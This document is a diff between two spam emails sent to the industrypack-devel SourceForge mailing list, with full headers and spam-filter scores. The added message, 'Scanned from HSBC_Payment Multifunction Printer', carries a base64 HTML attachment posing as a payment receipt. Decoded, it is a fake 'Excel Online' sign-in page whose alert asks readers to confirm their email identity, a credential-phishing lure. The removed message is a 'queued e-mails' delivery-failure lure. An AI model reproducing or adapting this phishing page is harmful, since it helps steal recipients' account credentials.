@@ -2,75 +2,75 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 88DC73B7EE5
-	for <lists+industrypack-devel@lfdr.de>; Wed, 30 Jun 2021 10:25:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 00EAB3B99D2
+	for <lists+industrypack-devel@lfdr.de>; Fri,  2 Jul 2021 01:59:36 +0200 (CEST)
 Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
 	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1lyVXW-0007I9-B6
-	for lists+industrypack-devel@lfdr.de; Wed, 30 Jun 2021 08:25:46 +0000
+	id 1lz6ak-0004ar-QV
+	for lists+industrypack-devel@lfdr.de; Thu, 01 Jul 2021 23:59:34 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-1.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <iconxiid@iconelevenid.de>) id 1lyVXU-0007Ho-FE
- for industrypack-devel@lists.sourceforge.net; Wed, 30 Jun 2021 08:25:44 +0000
+ (envelope-from <sales@agrifos.com>) id 1lz6ai-0004aP-Cl
+ for industrypack-devel@lists.sourceforge.net; Thu, 01 Jul 2021 23:59:32 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Subject:Date:From:Message-ID:Content-type:
- MIME-Version:To:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
+ To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=8PgI7g08h3hAPxsBUPi4/wJEjdwZd8mNGg4XRZ10ilg=; b=PV3jFcL08VLTQ6TbtqgYhgSiHy
- N+YcBXNbg0XX8jVe5lih0t4SjHWEn0TpeHtBTr2qGDAchOikkvxcqsBYFRWTk0zoPOUmxapUMAm5t
- b3RgmV4z1GCElyul2kPt5tbT/xS7eSyRx416EWJQ2Qq4zsnQmBqnAgeZLPLK+mzKC30Q=;
+ bh=FaBPRt5QVaz6VVodHMauR5EZgCqlvcuaPL0q+VAIrjc=; b=dalE0MEoMLcVPkkf1Tm3qCDRX6
+ 71aAEynRYnejUnMu1j5UAZEVb+gIU13L8fhTJaCJupGVTFZFCk0zH0CnEdPLrJt4D355N3Vkgz9ci
+ scp8ZbQaLqG0uKPeZbG+kehjk7Ez1GFozdEeqOG/F/D7bz9qlaJh3hkHxgXMKLfuPHMY=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Subject:Date:From:Message-ID:Content-type:MIME-Version:To:Sender:Reply-To
+ h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=8PgI7g08h3hAPxsBUPi4/wJEjdwZd8mNGg4XRZ10ilg=; b=X
- nOvSVABeUrMOTwBIdBrBU8D4k6lGo0C3Tc+uDXcKz385Gummj7I9D6G5rhFF8TzO7wTbZuqU8STof
- g3iNePPiaYtnTYiVC71ZVhZNMz3Ad19o2ocbxqJ/ZX9W+ynEk72J/9Nv5ucmvQPkebu43Fci3q0lV
- WvvqoXS68kA09sVk=;
-Received: from static.200.67.12.49.clients.datenruder.com ([49.12.67.200])
- by sfi-mx-1.v28.lw.sourceforge.com with esmtps
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.92.3)
- id 1lyVXS-004TLm-8S
- for industrypack-devel@lists.sourceforge.net; Wed, 30 Jun 2021 08:25:44 +0000
-Received: by static.200.67.12.49.clients.datenruder.com (Postfix,
- from userid 10000)
- id 6668566555; Wed, 30 Jun 2021 10:22:11 +0200 (CEST)
+ List-Owner:List-Archive; bh=FaBPRt5QVaz6VVodHMauR5EZgCqlvcuaPL0q+VAIrjc=; b=E
+ gB0qaHPr89IdaaRnL50r2PwhM5HuwwesrWO2p9PxkLSHR+HAKMENNw46WT/ALESIujNq659BwsAVq
+ 6nM6pJmwDOsBPXC0D7l+7DWjFjIsGRoT9kDcyGQuKh78nbBaVuMqRV4h7VyMZwRp7gokf5IZdKx8k
+ AYKHdPWRrWc8LFQw=;
+Received: from [147.182.166.209] (helo=mta0.agrifos.com)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
+ (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
+ id 1lz6aZ-0007Yn-O5
+ for industrypack-devel@lists.sourceforge.net; Thu, 01 Jul 2021 23:59:32 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=agrifos.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=sales@agrifos.com;
+ bh=FaBPRt5QVaz6VVodHMauR5EZgCqlvcuaPL0q+VAIrjc=;
+ b=u9SpOvJIxjwn9eUkGBoahMLhhoBoNWa6o4dSBy5u/cv2KcRCo4I7CNbnNwL7QWDJWSLbBEnauNtc
+ pN7jzai3wD2odhHGN8DMPNwyvSx1Vr7iG4YH6DX+rny/1HJ7fEuk0uGS20fGtzs7ucSKFSvSUVlX
+ pugycsBaFtYss4LGbec=
+From: Kimberly Lee <sales@agrifos.com>
 To: industrypack-devel@lists.sourceforge.net
+Date: 01 Jul 2021 16:39:11 -0700
+Message-ID: <20210701163911.5A675F590924EA11@agrifos.com>
 MIME-Version: 1.0
-X-MSMail-Priority: High
-Importance: High
-Message-ID: <1625041331-94a08da1fecbb6e8b46990538c7b50b2@iconelevenid.de>
-From: Lists ✉ Delivery Server <mailer_failed31895@static.200.67.12.49.clients.datenruder.com>
-Date: Wed, 30 Jun 2021 10:22:11 +0200 (CEST)
-X-Spam-Score: 8.6 (++++++++)
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0012_A9FE26CB.A1306DD6"
+X-Spam-Score: 5.5 (+++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
  0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
  See
  http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
- for more information. [URIs: appdomain.cloud]
- 0.0 CK_HELO_GENERIC        Relay used name indicative of a Dynamic Pool or
- Generic rPTR
- 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
- domains are different
- 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
+ for more information. [URIs: edaacil.com]
+ 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  1.0 HTML_MESSAGE           BODY: HTML included in message
  2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 1.8 MISSING_MIMEOLE        Message has X-MSMail-Priority, but no X-MimeOLE
- 3.2 HELO_DYNAMIC_IPADDR    Relay HELO'd using suspicious hostname (IP addr
- 1)
-X-VA-Spam-Flag: YES
-X-Spam-Flag: YES
-X-Headers-End: 1lyVXS-004TLm-8S
-Subject: [Industrypack-devel] =?utf-8?q?=5BSPAM=5D_Call_to_Action=3A_?=
- =?utf-8?q?=E2=9D=BE_incoming_=E2=9E=98_e-Mails_Queued_on_Server?=
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
+ not necessarily valid
+ 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
+ 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
+ 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
+ 0.0 T_REMOTE_IMAGE         Message contains an external image
+X-Headers-End: 1lz6aZ-0007Yn-O5
+Subject: [Industrypack-devel] Scanned from HSBC_Payment Multifunction Printer
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -82,644 +82,155 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============3199137543286568271=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============3199137543286568271==
-Content-type: text/HTML; charset="UTF-8X-Priority: 1 (Highest)
+This is a multi-part message in MIME format.
 
+------=_NextPart_000_0012_A9FE26CB.A1306DD6
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-	<!doctype html>
-<html xmlns='http://www.w3.org/1999/xhtml' xmlns:v='urn:schemas-microsoft-com:vml' xmlns:o='urn:schemas-microsoft-com:office:office'>
-    <head>
-        <!-- NAME: SIMPLE TEXT -->
-        <!--[if gte mso 15]>
-        <xml>
-            <o:OfficeDocumentSettings>
-            <o:AllowPNG/>
-            <o:PixelsPerInch>96</o:PixelsPerInch>
-            </o:OfficeDocumentSettings>
-        </xml>
-        <![endif]-->
-        <meta charset='UTF-8'>
-        <meta http-equiv='X-UA-Compatible' content='IE=edge'>
-        <meta name='viewport' content='width=device-width, initial-scale=1'>
-        <title>Unsubscribe</title>
-        
-    <style type='text/css'>
-		p{
-			margin:10px 0;
-			padding:0;
-		}
-		table{
-			border-collapse:collapse;
-		}
-		h1,h2,h3,h4,h5,h6{
-			display:block;
-			margin:0;
-			padding:0;
-		}
-		img,a img{
-			border:0;
-			height:auto;
-			outline:none;
-			text-decoration:none;
-		}
-		body,#bodyTable,#bodyCell{
-			height:100%;
-			margin:0;
-			padding:0;
-			width:100%;
-		}
-		.mcnPreviewText{
-			display:none !important;
-		}
-		#outlook a{
-			padding:0;
-		}
-		img{
-			-ms-interpolation-mode:bicubic;
-		}
-		table{
-			mso-table-lspace:0pt;
-			mso-table-rspace:0pt;
-		}
-		.ReadMsgBody{
-			width:100%;
-		}
-		.ExternalClass{
-			width:100%;
-		}
-		p,a,li,td,blockquote{
-			mso-line-height-rule:exactly;
-		}
-		a[href^=tel],a[href^=sms]{
-			color:inherit;
-			cursor:default;
-			text-decoration:none;
-		}
-		p,a,li,td,body,table,blockquote{
-			-ms-text-size-adjust:100%;
-			-webkit-text-size-adjust:100%;
-		}
-		.ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.ExternalClass span,.ExternalClass font{
-			line-height:100%;
-		}
-		a[x-apple-data-detectors]{
-			color:inherit !important;
-			text-decoration:none !important;
-			font-size:inherit !important;
-			font-family:inherit !important;
-			font-weight:inherit !important;
-			line-height:inherit !important;
-		}
-		#bodyCell{
-			padding:10px;
-		}
-		.templateContainer{
-			max-width:600px !important;
-		}
-		a.mcnButton{
-			display:block;
-		}
-		.mcnImage,.mcnRetinaImage{
-			vertical-align:bottom;
-		}
-		.mcnTextContent{
-			word-break:break-word;
-		}
-		.mcnTextContent img{
-			height:auto !important;
-		}
-		.mcnDividerBlock{
-			table-layout:fixed !important;
-		}
-	/*
-	@tab Page
-	@section Background Style
-	@tip Set the background color and top border for your email. You may want to choose colors that match your company's branding.
-	*/
-		body,#bodyTable{
-			/*@editable*/background-color:#FFFFFF;
-			/*@editable*/background-image:none;
-			/*@editable*/background-repeat:no-repeat;
-			/*@editable*/background-position:center;
-			/*@editable*/background-size:cover;
-		}
-	/*
-	@tab Page
-	@section Background Style
-	@tip Set the background color and top border for your email. You may want to choose colors that match your company's branding.
-	*/
-		#bodyCell{
-			/*@editable*/border-top:0;
-		}
-	/*
-	@tab Page
-	@section Email Border
-	@tip Set the border for your email.
-	*/
-		.templateContainer{
-			/*@editable*/border:0;
-		}
-	/*
-	@tab Page
-	@section Heading 1
-	@tip Set the styling for all first-level headings in your emails. These should be the largest of your headings.
-	@style heading 1
-	*/
-		h1{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:26px;
-			/*@editable*/font-style:normal;
-			/*@editable*/font-weight:bold;
-			/*@editable*/line-height:125%;
-			/*@editable*/letter-spacing:normal;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Page
-	@section Heading 2
-	@tip Set the styling for all second-level headings in your emails.
-	@style heading 2
-	*/
-		h2{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:22px;
-			/*@editable*/font-style:normal;
-			/*@editable*/font-weight:bold;
-			/*@editable*/line-height:125%;
-			/*@editable*/letter-spacing:normal;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Page
-	@section Heading 3
-	@tip Set the styling for all third-level headings in your emails.
-	@style heading 3
-	*/
-		h3{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:20px;
-			/*@editable*/font-style:normal;
-			/*@editable*/font-weight:bold;
-			/*@editable*/line-height:125%;
-			/*@editable*/letter-spacing:normal;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Page
-	@section Heading 4
-	@tip Set the styling for all fourth-level headings in your emails. These should be the smallest of your headings.
-	@style heading 4
-	*/
-		h4{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:18px;
-			/*@editable*/font-style:normal;
-			/*@editable*/font-weight:bold;
-			/*@editable*/line-height:125%;
-			/*@editable*/letter-spacing:normal;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Header
-	@section Header Style
-	@tip Set the borders for your email's header area.
-	*/
-		#templateHeader{
-			/*@editable*/border-top:0;
-			/*@editable*/border-bottom:0;
-		}
-	/*
-	@tab Header
-	@section Header Text
-	@tip Set the styling for your email's header text. Choose a size and color that is easy to read.
-	*/
-		#templateHeader .mcnTextContent,#templateHeader .mcnTextContent p{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:16px;
-			/*@editable*/line-height:150%;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Header
-	@section Header Link
-	@tip Set the styling for your email's header links. Choose a color that helps them stand out from your text.
-	*/
-		#templateHeader .mcnTextContent a,#templateHeader .mcnTextContent p a{
-			/*@editable*/color:#007C89;
-			/*@editable*/font-weight:normal;
-			/*@editable*/text-decoration:underline;
-		}
-	/*
-	@tab Body
-	@section Body Style
-	@tip Set the borders for your email's body area.
-	*/
-		#templateBody{
-			/*@editable*/border-top:0;
-			/*@editable*/border-bottom:0;
-		}
-	/*
-	@tab Body
-	@section Body Text
-	@tip Set the styling for your email's body text. Choose a size and color that is easy to read.
-	*/
-		#templateBody .mcnTextContent,#templateBody .mcnTextContent p{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:16px;
-			/*@editable*/line-height:150%;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Body
-	@section Body Link
-	@tip Set the styling for your email's body links. Choose a color that helps them stand out from your text.
-	*/
-		#templateBody .mcnTextContent a,#templateBody .mcnTextContent p a{
-			/*@editable*/color:#007C89;
-			/*@editable*/font-weight:normal;
-			/*@editable*/text-decoration:underline;
-		}
-	/*
-	@tab Footer
-	@section Footer Style
-	@tip Set the borders for your email's footer area.
-	*/
-		#templateFooter{
-			/*@editable*/border-top:0;
-			/*@editable*/border-bottom:0;
-		}
-	/*
-	@tab Footer
-	@section Footer Text
-	@tip Set the styling for your email's footer text. Choose a size and color that is easy to read.
-	*/
-		#templateFooter .mcnTextContent,#templateFooter .mcnTextContent p{
-			/*@editable*/color:#202020;
-			/*@editable*/font-family:Helvetica;
-			/*@editable*/font-size:12px;
-			/*@editable*/line-height:150%;
-			/*@editable*/text-align:left;
-		}
-	/*
-	@tab Footer
-	@section Footer Link
-	@tip Set the styling for your email's footer links. Choose a color that helps them stand out from your text.
-	*/
-		#templateFooter .mcnTextContent a,#templateFooter .mcnTextContent p a{
-			/*@editable*/color:#202020;
-			/*@editable*/font-weight:normal;
-			/*@editable*/text-decoration:underline;
-		}
-	@media only screen and (min-width:768px){
-		.templateContainer{
-			width:600px !important;
-		}
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-}	@media only screen and (max-width: 480px){
-		body,table,td,p,a,li,blockquote{
-			-webkit-text-size-adjust:none !important;
-		}
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>FYI.</P></BODY></HTML>
+------=_NextPart_000_0012_A9FE26CB.A1306DD6
+Content-Type: text/html; name="Payment Recipt-23007.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Payment Recipt-23007.html"
 
-}	@media only screen and (max-width: 480px){
-		body{
-			width:100% !important;
-			min-width:100% !important;
-		}
+IDwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8c2NyaXB0IGxhbmd1YWdlPSJKYXZhU2NyaXB0
+Ij4NCmFsZXJ0KCJNaWNyb3NvZnQgRXhjZWwgU2VjdXJlZCBEb2N1bWVudCwgUGxlYXNlIGNv
+bmZpcm0geW91ciBlbWFpbCBpZGVudGl0eSB0byB2aWV3IikNCjwvc2NyaXB0Pg0KPGhlYWQ+
+DQo8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iaHR0cHM6Ly9pLmd5
+YXpvLmNvbS84M2NmZmQxZWJmMjNlZDkzYWE5MjVlYjk1MjlmNTM0OC5wbmciPg0KPHRpdGxl
+PkV4Y2VsIE9ubGluZSA6OiBTaWduIGluIHRvIGNvbnRpbnVlLjwvdGl0bGU+DQo8L2hlYWQ+
+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KDQoNCmJvZHksIGh0bWwgew0KICBoZWlnaHQ6
+IDEwMCU7DQogIG1hcmdpbjogMDsNCiAgZm9udC1mYW1pbHk6ICJTZWdvZSBVSSBXZWJmb250
+IiwtYXBwbGUtc3lzdGVtLCJIZWx2ZXRpY2EgTmV1ZSIsIkx1Y2lkYSBHcmFuZGUiLCJSb2Jv
+dG8iLCJFYnJpbWEiLCJOaXJtYWxhIFVJIiwiR2FkdWdpIiwiU2Vnb2UgWGJveCBTeW1ib2wi
+LCJTZWdvZSBVSSBTeW1ib2wiLCJNZWlyeW8gVUkiLCJLaG1lciBVSSIsIlR1bmdhIiwiTGFv
+IFVJIiwiUmFhdmkiLCJJc2tvb2xhIFBvdGEiLCJMYXRoYSIsIkxlZWxhd2FkZWUiLCJNaWNy
+b3NvZnQgWWFIZWkgVUkiLCJNaWNyb3NvZnQgSmhlbmdIZWkgVUkiLCJNYWxndW4gR290aGlj
+IiwiRXN0cmFuZ2VsbyBFZGVzc2EiLCJNaWNyb3NvZnQgSGltYWxheWEiLCJNaWNyb3NvZnQg
+TmV3IFRhaSBMdWUiLCJNaWNyb3NvZnQgUGhhZ3NQYSIsIk1pY3Jvc29mdCBUYWkgTGUiLCJN
+aWNyb3NvZnQgWWkgQmFpdGkiLCJNb25nb2xpYW4gQmFpdGkiLCJNViBCb2xpIiwiTXlhbm1h
+ciBUZXh0IiwiQ2FtYnJpYSBNYXRoIjsNCn0NCg0KCS53cmFwcGVyIHsNCiAgYmFja2dyb3Vu
+ZC1pbWFnZTogdXJsKCJodHRwczovL2kuZ3lhem8uY29tLzQ2MzMzZmIzNDcyM2ZiM2YyN2Yw
+ODU2ODViZWZlZWYzLnBuZyIpOw0KICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0K
+ICBiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGNvdmVyOw0KICBiYWNrZ3JvdW5kLXBvc2l0aW9u
+OiBjb3ZlcjsNCiAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgcG9zaXRpb246IGZpeGVk
+Ow0KICB0b3A6IDA7DQogIGxlZnQ6IDA7DQogIGhlaWdodDogMTAwJTsNCiAgd2lkdGg6IDEw
+MCU7DQoNCiAgLyogdGhpcyBpcyB3aGF0IGNlbnRlcnMgeW91ciBlbGVtZW50IGluIHRoZSBm
+aXhlZCB3cmFwcGVyKi8NCiAgZGlzcGxheTogZmxleDsNCiAgZmxleC1mbG93OiBjb2x1bW4g
+bm93cmFwOw0KICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgLyogYWxpZ25zIG9uIHZlcnRp
+Y2FsIGZvciBjb2x1bW4gKi8NCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsgLyogYWxpZ25zIG9u
+IGhvcml6b250YWwgZm9yIGNvbHVtbiAqLw0KDQogIC8qIGp1c3QgZm9yIHN0eWxpbmcgdG8g
+c2VlIHRoZSBsaW1pdHMgKi8NCiAgLypib3JkZXI6IDJweCBkYXNoZWQgcmVkOyAqLw0KICBi
+b3gtc2l6aW5nOiBib3JkZXItYm94Ow0KfQ0KDQouZWxlbWVudCB7DQogIHdpZHRoOiAzNTBw
+eDsNCiAgaGVpZ2h0OiAyNTBweDsNCiAgcGFkZGluZzogMzVweCAyNXB4Ow0KDQogIC8qIEp1
+c3QgZm9yIHN0eWxpbmcgKi8NCiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsNCiAgYm9y
+ZGVyOiAxcHggc29saWQgZ3JleTsNCn0NCi5lbGVtZW50ZXsNCgl3aWR0aDogMzUwcHg7DQog
+IGhlaWdodDogMjUwcHg7DQogIHBhZGRpbmc6IDM1cHggMjVweDsNCg0KICAvKiBKdXN0IGZv
+ciBzdHlsaW5nICovDQogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7DQogIGJvcmRlcjog
+MXB4IHNvbGlkIGdyZXk7DQp9DQoubG9nb3sNCgliYWNrZ3JvdW5kLWltYWdlOiB1cmwoIm1p
+Yy5wbmciKTsNCn0NCmlucHV0ew0KICAgIGJvcmRlcjowOw0KICAgIHdpZHRoOiAxMDAlOw0K
+ICAgIHBhZGRpbmc6NXB4IDBweDsNCiAgICBmb250LXNpemU6MS4wZW07DQogICAgZm9udC1m
+YW1pbHk6ICJTZWdvZSBVSSBXZWJmb250IiwtYXBwbGUtc3lzdGVtLCJIZWx2ZXRpY2EgTmV1
+ZSIsIkx1Y2lkYSBHcmFuZGUiLCJSb2JvdG8iLCJFYnJpbWEiLCJOaXJtYWxhIFVJIiwiR2Fk
+dWdpIiwiU2Vnb2UgWGJveCBTeW1ib2wiLCJTZWdvZSBVSSBTeW1ib2wiLCJNZWlyeW8gVUki
+LCJLaG1lciBVSSIsIlR1bmdhIiwiTGFvIFVJIiwiUmFhdmkiLCJJc2tvb2xhIFBvdGEiLCJM
+YXRoYSIsIkxlZWxhd2FkZWUiLCJNaWNyb3NvZnQgWWFIZWkgVUkiLCJNaWNyb3NvZnQgSmhl
+bmdIZWkgVUkiLCJNYWxndW4gR290aGljIiwiRXN0cmFuZ2VsbyBFZGVzc2EiLCJNaWNyb3Nv
+ZnQgSGltYWxheWEiLCJNaWNyb3NvZnQgTmV3IFRhaSBMdWUiLCJNaWNyb3NvZnQgUGhhZ3NQ
+YSIsIk1pY3Jvc29mdCBUYWkgTGUiLCJNaWNyb3NvZnQgWWkgQmFpdGkiLCJNb25nb2xpYW4g
+QmFpdGkiLCJNViBCb2xpIiwiTXlhbm1hciBUZXh0IiwiQ2FtYnJpYSBNYXRoIjsNCiAgICBj
+b2xvcjpibGFjazsNCiAgICBib3JkZXItYm90dG9tOnNvbGlkIDFweCAjY2NjOw0KDQogICAg
+Ym9yZGVyLXdpZHRoOiAxcHg7DQogICAgYm9yZGVyLWNvbG9yOiAjNjY2Ow0KICAgIGJvcmRl
+ci1jb2xvcjogcmdiYSgwLDAsMCwwLjYpOw0KICAgIGhlaWdodDogMzZweDsNCiAgICBvdXRs
+aW5lOiBub25lOw0KICAgIGJvcmRlci1yYWRpdXM6IDA7DQogICAgLXdlYmtpdC1ib3JkZXIt
+cmFkaXVzOiAwOw0KICAgIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50Ow0KICAgIGZv
+bnQtd2VpZ2h0OjQwMDsNCg0KfQ0KaW5wdXQ6Zm9jdXMsYnV0dG9uOmZvY3VzIHsNCiAgICBi
+b3JkZXI6IDA7DQogICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIGJsdWU7DQogICAgb3V0
+bGluZTogbm9uZSAhaW1wb3J0YW50Ow0KDQp9DQpkaXYgLnNpZ24tb3B0IHsNCglwYWRkaW5n
+OiAyMHB4IDBweDsNCglmb250LXNpemU6IDE0cHg7DQp9DQoNCmRpdiAuYnV0dG9uIHsNCglw
+YWRkaW5nOiAyMHB4IDBweDsNCglmb250LXNpemU6IDE2cHg7DQoJdGV4dC1hbGlnbjogcmln
+aHQ7DQp9DQoubmV3YnV0dG9uew0KCXBhZGRpbmc6IDVweDsNCgl3aWR0aDogNTBweDsNCglt
+YXgtd2lkdGg6IDEwMHB4Ow0KCWZvbnQtc2l6ZTogMTRweDsNCgl3aWR0aDogMTAwcHg7DQoJ
+Y29sb3I6IHdoaXRlOw0KCWJhY2tncm91bmQtY29sb3I6ICMwMDVkYTY7DQp9DQouYWxlcnQt
+ZXJyb3Igew0KICAgIGNvbG9yOiAjZTgxMTIzOw0KICAgIHRleHQtYWxpZ246IGxlZnQ7DQog
+ICAgbWFyZ2luLWJvdHRvbTogMDsNCiAgICBtYXJnaW4tYm90dG9tOiAwOw0KICAgIGZvbnQt
+ZmFtaWx5OiAiU2Vnb2UgVUkgV2ViZm9udCIsLWFwcGxlLXN5c3RlbSwiSGVsdmV0aWNhIE5l
+dWUiLCJMdWNpZGEgR3JhbmRlIiwiUm9ib3RvIiwiRWJyaW1hIiwiTmlybWFsYSBVSSIsIkdh
+ZHVnaSIsIlNlZ29lIFhib3ggU3ltYm9sIiwiU2Vnb2UgVUkgU3ltYm9sIiwiTWVpcnlvIFVJ
+IiwiS2htZXIgVUkiLCJUdW5nYSIsIkxhbyBVSSIsIlJhYXZpIiwiSXNrb29sYSBQb3RhIiwi
+TGF0aGEiLCJMZWVsYXdhZGVlIiwiTWljcm9zb2Z0IFlhSGVpIFVJIiwiTWljcm9zb2Z0IEpo
+ZW5nSGVpIFVJIiwiTWFsZ3VuIEdvdGhpYyIsIkVzdHJhbmdlbG8gRWRlc3NhIiwiTWljcm9z
+b2Z0IEhpbWFsYXlhIiwiTWljcm9zb2Z0IE5ldyBUYWkgTHVlIiwiTWljcm9zb2Z0IFBoYWdz
+UGEiLCJNaWNyb3NvZnQgVGFpIExlIiwiTWljcm9zb2Z0IFlpIEJhaXRpIiwiTW9uZ29saWFu
+IEJhaXRpIiwiTVYgQm9saSIsIk15YW5tYXIgVGV4dCIsIkNhbWJyaWEgTWF0aCI7DQp9DQph
+OnZpc2l0ZWQgew0KICAgIGNvbG9yOiAjMDA2N2I4Ow0KfQ0KYTpsaW5rIHsNCiAgICBjb2xv
+cjogIzAwNjdiODsNCn0NCmEgew0KICAgIGNvbG9yOiAjY2NjOw0KICAgIHRleHQtZGVjb3Jh
+dGlvbjogbm9uZTsNCn0NCmEgew0KICAgIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50
+Ow0KfQ0KLmlkZW50aXR5QmFubmVyIHsNCiAgICBoZWlnaHQ6IDI0cHg7DQogICAgYmFja2dy
+b3VuZDogI2ZmZjsNCiAgICBtYXJnaW4tdG9wOiAxNnB4Ow0KICAgIG1hcmdpbi1ib3R0b206
+IC00cHg7DQp9DQoudGV4dC10aXRsZSB7DQogICAgY29sb3I6ICMxYjFiMWI7DQogICAgZm9u
+dC1zaXplOiAxLjVyZW07DQogICAgZm9udC13ZWlnaHQ6IDYwMDsNCiAgICBwYWRkaW5nOiAw
+Ow0KICAgIG1hcmdpbi10b3A6IDE2cHg7DQogICAgbWFyZ2luLWJvdHRvbTogMTJweDsNCiAg
+ICBmb250LWZhbWlseTogIlNlZ29lIFVJIiwiSGVsdmV0aWNhIE5ldWUiLCJMdWNpZGEgR3Jh
+bmRlIiwiUm9ib3RvIiwiRWJyaW1hIiwiTmlybWFsYSBVSSIsIkdhZHVnaSIsIlNlZ29lIFhi
+b3ggU3ltYm9sIiwiU2Vnb2UgVUkgU3ltYm9sIiwiTWVpcnlvIFVJIiwiS2htZXIgVUkiLCJU
+dW5nYSIsIkxhbyBVSSIsIlJhYXZpIiwiSXNrb29sYSBQb3RhIiwiTGF0aGEiLCJMZWVsYXdh
+ZGVlIiwiTWljcm9zb2Z0IFlhSGVpIFVJIiwiTWljcm9zb2Z0IEpoZW5nSGVpIFVJIiwiTWFs
+Z3VuIEdvdGhpYyIsIkVzdHJhbmdlbG8gRWRlc3NhIiwiTWljcm9zb2Z0IEhpbWFsYXlhIiwi
